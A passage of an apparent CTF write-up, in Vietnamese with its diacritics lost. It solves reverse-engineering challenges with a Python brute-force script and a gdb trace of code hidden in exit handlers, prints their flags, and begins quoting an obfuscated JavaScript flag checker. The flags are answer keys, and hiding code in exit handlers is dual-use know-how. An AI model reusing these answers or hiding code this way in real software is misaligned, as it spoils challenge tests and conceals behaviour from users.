</span></span><span style="display:flex;"><span>num <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x577020</span>,<span style="color:#ae81ff">0x302071</span>,<span style="color:#ae81ff">0x797022</span>,<span style="color:#ae81ff">0x612073</span>,<span style="color:#ae81ff">0x357024</span>,<span style="color:#ae81ff">0x712075</span>,<span style="color:#ae81ff">0x597026</span>,<span style="color:#ae81ff">0x372077</span>,<span style="color:#ae81ff">0x787028</span>,<span style="color:#ae81ff">0x3a2079</span>,<span style="color:#ae81ff">0x78702a</span>,<span style="color:#ae81ff">0x6a207b</span>,<span style="color:#ae81ff">0x78702c</span>,<span style="color:#ae81ff">0x3c207d</span>,<span style="color:#ae81ff">0x3e702e</span>,<span style="color:#ae81ff">0x61207f</span>,<span style="color:#ae81ff">0x4f7030</span>,<span style="color:#ae81ff">0x672061</span>,<span style="color:#ae81ff">0x737032</span>,<span style="color:#ae81ff">0x662063</span>,<span style="color:#ae81ff">0x787034</span>,<span style="color:#ae81ff">0x612065</span>,<span style="color:#ae81ff">0x497036</span>,<span style="color:#ae81ff">0x702067</span>,<span style="color:#ae81ff">0x777038</span>,<span style="color:#ae81ff">0x762069</span>,<span style="color:#ae81ff">0x7e703a</span>,<span style="color:#ae81ff">0x44206b</span>,<span style="color:#ae81ff">0x76703c</span>,<span style="color:#ae81ff">0x2d206d</span>,<span style="color:#ae81ff">0x7c703e</span>,<span style="color:#ae81ff">0x62206f</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>idx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> key <span style="color:#f92672">in</span> num:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> idx <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (((((x <span style="color:#f92672">^</span> idx) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x7020</span>) <span style="color:#f92672">^</span> idx) <span style="color:#f92672">==</span> key):
</span></span><span style="display:flex;"><span>                flag<span style="color:#f92672">.</span>append(x)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (((((y <span style="color:#f92672">^</span> idx) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x2070</span>) <span style="color:#f92672">^</span> idx) <span style="color:#f92672">==</span> key):
</span></span><span style="display:flex;"><span>                flag<span style="color:#f92672">.</span>append(y)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    idx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(chr(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> flag))
</span></span></code></pre></div><p>-&gt; <code>FLAG: W1{b1t_0p3rat10n_vault_good_j0b}</code></p>
<h2 id="wanna-one-intels">wanna-one intels</h2>
<p><code>Description: Wait what? The intel is empty?????</code></p>
<p><code>Chall file:</code> <a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/wannaone-intels/wanna-one-intels">wanna-one-intels</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#f92672">~/</span>CTF<span style="color:#f92672">/</span>wannagame<span style="color:#f92672">/</span>chall                                                          <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">18</span><span style="color:#f92672">:</span><span style="color:#ae81ff">50</span><span style="color:#f92672">:</span><span style="color:#ae81ff">01</span> <span style="color:#960050;background-color:#1e0010"></span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> file wanna<span style="color:#f92672">-</span>one<span style="color:#f92672">-</span>intels                                                                        <span style="color:#960050;background-color:#1e0010"></span>
</span></span><span style="display:flex;"><span>wanna<span style="color:#f92672">-</span>one<span style="color:#f92672">-</span>intels: ELF <span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>bit LSB executable, x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span>, version <span style="color:#ae81ff">1</span> (GNU<span style="color:#f92672">/</span>Linux), statically linked, BuildID[sha1]<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>d076f0b0fa3a59f76928ddb65212898859409ff, <span style="color:#66d9ef">for</span> GNU<span style="color:#f92672">/</span>Linux <span style="color:#ae81ff">3.2.0</span>, not stripped
</span></span></code></pre></div><p>Vn l 1 file ELF 64bit (khng b stripped), nhng lc mnh kim tra hm main, th n ch thc hin return ??
Vy th chng trnh giu s code cn li  u ????</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401620</span> ; <span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401620</span>                 public main
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401620</span> main            proc near               ; DATA XREF: _start<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span><span style="color:#960050;background-color:#1e0010"></span>o
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401620</span> ; __unwind {
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401620</span>                 endbr64
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401624</span>                 xor     eax, eax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401626</span>                 retn
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401626</span> ; } <span style="color:#75715e">// starts at 401620
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.text:<span style="color:#ae81ff">0000000000401626</span> main            endp
</span></span></code></pre></div><p>Ban u, mnh thy hi hoang mang, v v y l file binary dng <code>statically linked</code>, nn mnh kh li trong vic tm xem hm no n giu trong IDA</p>
<p>Nn mnh quyt nh chy file v c kt qu sau:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#f92672">~/</span>CTF<span style="color:#f92672">/</span>wannagame<span style="color:#f92672">/</span>chall                                                                                                                           <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">12</span><span style="color:#f92672">:</span><span style="color:#ae81ff">19</span><span style="color:#f92672">:</span><span style="color:#ae81ff">58</span> <span style="color:#960050;background-color:#1e0010"></span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> .<span style="color:#f92672">/</span>wanna<span style="color:#f92672">-</span>one<span style="color:#f92672">-</span>intels                                                                                                                                            <span style="color:#960050;background-color:#1e0010"></span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">?????</span> 
</span></span></code></pre></div><p>, mc nhin hm <code>main</code> ch <code>xor eax, eax; ret</code> m li c th in ra c cc k t <code>c bit</code> nh ny, mnh ly lm l.
Mnh nghi ng l  hm <code>start</code> hoc <code>exit</code> khi chng trnh bt u hoc kt thc c nhng on code n  in cc k t ny</p>
<p> chc chn, mnh dng <code>gdb</code>  debug v t <code>breakpoint</code>  ret  kim tra</p>
<pre tabindex="0"><code> 0x401626 &lt;main+6&gt;                        ret                                  &lt;0x401b8a; __libc_start_call_main+106&gt;
    
   0x401b8a &lt;__libc_start_call_main+106&gt;    mov    edi, eax
</code></pre><p>Mnh  ti c <code>ret</code> v cha c g c in ra, mnh ln theo hm <code>exit</code>  xem th g xy ra. V mnh  pht hin c 1 th c bit</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  <span style="color:#ae81ff">0x40a7f0</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">&gt;</span>       movabs rax, <span style="color:#ae81ff">0x101010101010101</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a7fa</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">10</span><span style="color:#f92672">&gt;</span>    push   rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a7fb</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>    movabs rax, <span style="color:#ae81ff">0x1010b3e3e3e3e3e</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a805</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">21</span><span style="color:#f92672">&gt;</span>    xor    qword ptr [rsp], rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a809</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">25</span><span style="color:#f92672">&gt;</span>    mov    rsi, rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a80c</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">28</span><span style="color:#f92672">&gt;</span>    push   <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a80e</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">30</span><span style="color:#f92672">&gt;</span>    pop    rdi
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a80f</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">31</span><span style="color:#f92672">&gt;</span>    push   <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a811</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;</span>    pop    rdx
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a812</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">34</span><span style="color:#f92672">&gt;</span>    push   <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a814</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">36</span><span style="color:#f92672">&gt;</span>    pop    rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a815</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">37</span><span style="color:#f92672">&gt;</span>    syscall
</span></span></code></pre></div><p> trong hm <code>__run_exit_handlers</code> tht s  dng cc ch th  in ra chui k t <code>????</code>, mnh tip tc theo hm ny  xem c chuyn g xy ra</p>
<p>-&gt; Cui cng, mnh thy hm dng 1 vng lp  thc hin cc php ton v c gim stack cho n khi y  k t flag v tip tc kim tra trn stack th mnh thy cc k t ca flag, sau  chng trnh gi syscall exit  kt thc</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0000</span><span style="color:#960050;background-color:#1e0010"></span> rsp <span style="color:#ae81ff">0x7fffffffdd00</span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">0x747375637b3157b0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span><span style="color:#f92672">:</span><span style="color:#ae81ff">000</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010"></span>     <span style="color:#ae81ff">0x7fffffffdd08</span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">0</span>m_r0ut1n3s_w0w<span style="color:#f92672">!</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0010</span><span style="color:#960050;background-color:#1e0010"></span>     <span style="color:#ae81ff">0x7fffffffdd10</span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010">&#39;</span>n3s_w0w<span style="color:#f92672">!</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span><span style="color:#f92672">:</span><span style="color:#ae81ff">001</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010"></span>     <span style="color:#ae81ff">0x7fffffffdd18</span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">0x7d</span> <span style="color:#75715e">/* &#39;}&#39; */</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0020</span><span style="color:#960050;background-color:#1e0010"></span> rsi <span style="color:#ae81ff">0x7fffffffdd20</span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">0xa3f3f3f3f3f</span> <span style="color:#75715e">/* &#39;?????\n&#39; */</span>
</span></span></code></pre></div><p>Get flag !</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> search <span style="color:#960050;background-color:#1e0010">&#39;</span>W1{<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>Searching <span style="color:#66d9ef">for</span> value: <span style="color:#960050;background-color:#1e0010">&#39;</span>W1{<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>[stack]         <span style="color:#ae81ff">0x7fffffffdd01</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>W1{cust0m_r0ut1n3s_w0w<span style="color:#f92672">!</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span></code></pre></div><p>-&gt; <code>FLAG: W1{cust0m_r0ut1n3s_w0w!}</code></p>
<h2 id="pu-pu-flag-checker">Pu Pu flag checker</h2>
<p><code>Description: I thought it really easy.</code></p>
<p><code>Chall file:</code> <a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/pupu-flag-checker/flagchecker.html">flagchecker.html</a></p>
<pre tabindex="0"><code>Welcome to Pu Pu Flag checker
 
Input your flag, ex: W1{You_suck}     [Confirm]
</code></pre><p>-&gt; Chng trnh cho ta 1 file html, dng nh l trang  check flag c in, mnh view source  xem chng trnh cha g, th thy 1 dng cha nhng on code c v quen thuc</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>(<span style="color:#a6e22e">function</span>(_0x21262b,_0x48fc44){<span style="color:#66d9ef">const</span> _0x3d9bc6<span style="color:#f92672">=</span>_0x17ea,_0x1bc71f<span style="color:#f92672">=</span><span style="color:#a6e22e">_0x21262b</span>();<span style="color:#66d9ef">while</span>(<span style="color:#f92672">!!</span>[]){try{<span style="color:#66d9ef">const</span> _0x101b0c<span style="color:#f92672">=</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x92</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x1</span><span style="color:#f92672">+</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x89</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x2</span><span style="color:#f92672">+-</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x8d</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x3</span><span style="color:#f92672">+-</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x87</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x4</span><span style="color:#f92672">*</span>(<span style="color:#f92672">-</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x8f</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x5</span>)<span style="color:#f92672">+</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x94</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x6</span><span style="color:#f92672">+-</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x84</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x7</span><span style="color:#f92672">+</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x8e</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x8</span><span style="color:#f92672">*</span>(<span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x90</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x9</span>);<span style="color:#66d9ef">if</span>(_0x101b0c<span style="color:#f92672">===</span>_0x48fc44)<span style="color:#66d9ef">break</span>;<span style="color:#66d9ef">else</span> _0x1bc71f[<span style="color:#960050;background-color:#1e0010">&#39;</span>push<span style="color:#960050;background-color:#1e0010">&#39;</span>](_0x1bc71f[<span style="color:#960050;background-color:#1e0010">&#39;</span>shift<span style="color:#960050;background-color:#1e0010">&#39;</span>]());}<span style="color:#a6e22e">catch</span>(_0x20c5ae){_0x1bc71f[<span style="color:#960050;background-color:#1e0010">&#39;</span>push<span style="color:#960050;background-color:#1e0010">&#39;</span>](_0x1bc71f[<span style="color:#960050;background-color:#1e0010">&#39;</span>shift<span style="color:#960050;background-color:#1e0010">&#39;</span>]());}}}(_0x16be,<span style="color:#ae81ff">0xedeb9</span>));function <span style="color:#a6e22e">getRandomInt</span>(_0x35fac5,_0x501f88){<span style="color:#66d9ef">const</span> _0x4edb8c<span style="color:#f92672">=</span>_0x17ea;<span style="color:#66d9ef">return</span> Math[<span style="color:#a6e22e">_0x4edb8c</span>(<span style="color:#ae81ff">0x8a</span>)](Math[<span style="color:#a6e22e">_0x4edb8c</span>(<span style="color:#ae81ff">0x96</span>)]()<span style="color:#f92672">*</span>(_0x501f88<span style="color:#f92672">-</span>_0x35fac5<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1</span>))<span style="color:#f92672">+</span>_0x35fac5;}function <span style="color:#a6e22e">byteArrayToBase64</span>(_0x458f88){<span style="color:#66d9ef">const</span> _0x2bd1a7<span style="color:#f92672">=</span>_0x17ea;let _0x148301<span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;&#39;</span>;<span style="color:#66d9ef">for</span>(let _0x5a2524<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0</span>;_0x5a2524<span style="color:#f92672">&lt;</span>_0x458f88[<span style="color:#a6e22e">_0x2bd1a7</span>(<span style="color:#ae81ff">0x8b</span>)];_0x5a2524<span style="color:#f92672">++</span>){_0x148301<span style="color:#f92672">+=</span>String[<span style="color:#a6e22e">_0x2bd1a7</span>(<span style="color:#ae81ff">0x95</span>)](_0x458f88[_0x5a2524]);}<span style="color:#66d9ef">const</span> _0x123abd<span style="color:#f92672">=</span><span style="color:#a6e22e">btoa</span>(_0x148301);<span style="color:#66d9ef">return</span> _0x123abd;}function <span style="color:#a6e22e">_0x17ea</span>(_0x1ef9b6,_0x14509b){<span style="color:#66d9ef">const</span> _0x16be78<span style="color:#f92672">=</span><span style="color:#a6e22e">_0x16be</span>();<span style="color:#66d9ef">return</span> _0x17ea<span style="color:#f92672">=</span><span style="color:#a6e22e">function</span>(_0x17eabc,_0x5afbf3){_0x17eabc<span style="color:#f92672">=</span>_0x17eabc<span style="color:#f92672">-</span><span style="color:#ae81ff">0x84</span>;let _0xe824bb<span style="color:#f92672">=</span>_0x16be78[_0x17eabc];<span style="color:#66d9ef">return</span> _0xe824bb;},<span style="color:#a6e22e">_0x17ea</span>(_0x1ef9b6,_0x14509b);}function <span style="color:#a6e22e">xorStrings</span>(_0x5601ff,_0x11ecad){<span style="color:#66d9ef">const</span> _0x403f41<span style="color:#f92672">=</span>_0x17ea;let _0x3822c6<span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;&#39;</span>;<span style="color:#66d9ef">for</span>(let _0x304d5b<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0</span>;_0x304d5b<span style="color:#f92672">&lt;</span>_0x5601ff[<span style="color:#960050;background-color:#1e0010">&#39;</span>length<span style="color:#960050;background-color:#1e0010">&#39;</span>]<span style="color:#f92672">&amp;&amp;</span>_0x304d5b<span style="color:#f92672">&lt;</span>_0x11ecad[<span style="color:#a6e22e">_0x403f41</span>(<span style="color:#ae81ff">0x8b</span>)];_0x304d5b<span style="color:#f92672">++</span>){<span style="color:#66d9ef">const</span> _0x1a8e54<span style="color:#f92672">=</span>_0x5601ff[<span style="color:#960050;background-color:#1e0010">&#39;</span>charCodeAt<span style="color:#960050;background-color:#1e0010">&#39;</span>](_0x304d5b),_0x51cc58<span style="color:#f92672">=</span>_0x11ecad[<span style="color:#960050;background-color:#1e0010">&#39;</span>charCodeAt<span style="color:#960050;background-color:#1e0010">&#39;</span>](_0x304d5b),_0x1d436b<span style="color:#f92672">=</span>_0x1a8e54<span style="color:#f92672">^</span>_0x51cc58;_0x3822c6<span style="color:#f92672">+=</span>String[<span style="color:#a6e22e">_0x403f41</span>(<span style="color:#ae81ff">0x95</span>)](_0x1d436b);}<span style="color:#66d9ef">return</span> _0x3822c6;}function <span style="color:#a6e22e">check</span>(_0x3b37a2){<span style="color:#66d9ef">const</span> _0x452468<span style="color:#f92672">=</span>_0x17ea;var _0x41bc91<span style="color:#f92672">=</span>[<span style="color:#ae81ff">0x63</span>,<span style="color:#ae81ff">0x7c</span>,<span style="color:#ae81ff">0x77</span>,<span style="color:#ae81ff">0x7b</span>,<span style="color:#ae81ff">0xf2</span>,<span style="color:#ae81ff">0x6b</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0xc5</span>,<span style="color:#ae81ff">0x30</span>,<span style="color:#ae81ff">0x1</span>,<span style="color:#ae81ff">0x67</span>,<span style="color:#ae81ff">0x2b</span>,<span style="color:#ae81ff">0xfe</span>,<span style="color:#ae81ff">0xd7</span>,<span style="color:#ae81ff">0xab</span>,<span style="color:#ae81ff">0x76</span>,<span style="color:#ae81ff">0xca</span>,<span style="color:#ae81ff">0x82</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x7d</span>,<span style="color:#ae81ff">0xfa</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x47</span>,<span style="color:#ae81ff">0xf0</span>,<span style="color:#ae81ff">0xad</span>,<span style="color:#ae81ff">0xd4</span>,<span style="color:#ae81ff">0xa2</span>,<span style="color:#ae81ff">0xaf</span>,<span style="color:#ae81ff">0x9c</span>,<span style="color:#ae81ff">0xa4</span>,<span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0xc0</span>,<span style="color:#ae81ff">0xb7</span>,<span style="color:#ae81ff">0xfd</span>,<span style="color:#ae81ff">0x93</span>,<span style="color:#ae81ff">0x26</span>,<span style="color:#ae81ff">0x36</span>,<span style="color:#ae81ff">0x3f</span>,<span style="color:#ae81ff">0xf7</span>,<span style="color:#ae81ff">0xcc</span>,<span style="color:#ae81ff">0x34</span>,<span style="color:#ae81ff">0xa5</span>,<span style="color:#ae81ff">0xe5</span>,<span style="color:#ae81ff">0xf1</span>,<span style="color:#ae81ff">0x71</span>,<span style="color:#ae81ff">0xd8</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0x15</span>,<span style="color:#ae81ff">0x4</span>,<span style="color:#ae81ff">0xc7</span>,<span style="color:#ae81ff">0x23</span>,<span style="color:#ae81ff">0xc3</span>,<span style="color:#ae81ff">0x18</span>,<span style="color:#ae81ff">0x96</span>,<span style="color:#ae81ff">0x5</span>,<span style="color:#ae81ff">0x9a</span>,<span style="color:#ae81ff">0x7</span>,<span style="color:#ae81ff">0x12</span>,<span style="color:#ae81ff">0x80</span>,<span style="color:#ae81ff">0xe2</span>,<span style="color:#ae81ff">0xeb</span>,<span style="color:#ae81ff">0x27</span>,<span style="color:#ae81ff">0xb2</span>,<span style="color:#ae81ff">0x75</span>,<span style="color:#ae81ff">0x9</span>,<span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0x2c</span>,<span style="color:#ae81ff">0x1a</span>,<span style="color:#ae81ff">0x1b</span>,<span style="color:#ae81ff">0x6e</span>,<span style="color:#ae81ff">0x5a</span>,<span style="color:#ae81ff">0xa0</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x3b</span>,<span style="color:#ae81ff">0xd6</span>,<span style="color:#ae81ff">0xb3</span>,<span style="color:#ae81ff">0x29</span>,<span style="color:#ae81ff">0xe3</span>,<span style="color:#ae81ff">0x2f</span>,<span style="color:#ae81ff">0x84</span>,<span style="color:#ae81ff">0x53</span>,<span style="color:#ae81ff">0xd1</span>,<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">0xed</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0xfc</span>,<span style="color:#ae81ff">0xb1</span>,<span style="color:#ae81ff">0x5b</span>,<span style="color:#ae81ff">0x6a</span>,<span style="color:#ae81ff">0xcb</span>,<span style="color:#ae81ff">0xbe</span>,<span style="color:#ae81ff">0x39</span>,<span style="color:#ae81ff">0x4a</span>,<span style="color:#ae81ff">0x4c</span>,<span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0xcf</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0xef</span>,<span style="color:#ae81ff">0xaa</span>,<span style="color:#ae81ff">0xfb</span>,<span style="color:#ae81ff">0x43</span>,<span style="color:#ae81ff">0x4d</span>,<span style="color:#ae81ff">0x33</span>,<span style="color:#ae81ff">0x85</span>,<span style="color:#ae81ff">0x45</span>,<span style="color:#ae81ff">0xf9</span>,<span style="color:#ae81ff">0x2</span>,<span style="color:#ae81ff">0x7f</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0x3c</span>,<span style="color:#ae81ff">0x9f</span>,<span style="color:#ae81ff">0xa8</span>,<span style="color:#ae81ff">0x51</span>,<span style="color:#ae81ff">0xa3</span>,<span style="color:#ae81ff">0x40</span>,<span style="color:#ae81ff">0x8f</span>,<span style="color:#ae81ff">0x92</span>,<span style="color:#ae81ff">0x9d</span>,<span style="color:#ae81ff">0x38</span>,<span style="color:#ae81ff">0xf5</span>,<span style="color:#ae81ff">0xbc</span>,<span style="color:#ae81ff">0xb6</span>,<span style="color:#ae81ff">0xda</span>,<span style="color:#ae81ff">0x21</span>,<span style="color:#ae81ff">0x10</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xf3</span>,<span style="color:#ae81ff">0xd2</span>,<span style="color:#ae81ff">0xcd</span>,<span style="color:#ae81ff">0xc</span>,<span style="color:#ae81ff">0x13</span>,<span style="color:#ae81ff">0xec</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x97</span>,<span style="color:#ae81ff">0x44</span>,<span style="color:#ae81ff">0x17</span>,<span style="color:#ae81ff">0xc4</span>,<span style="color:#ae81ff">0xa7</span>,<span style="color:#ae81ff">0x7e</span>,<span 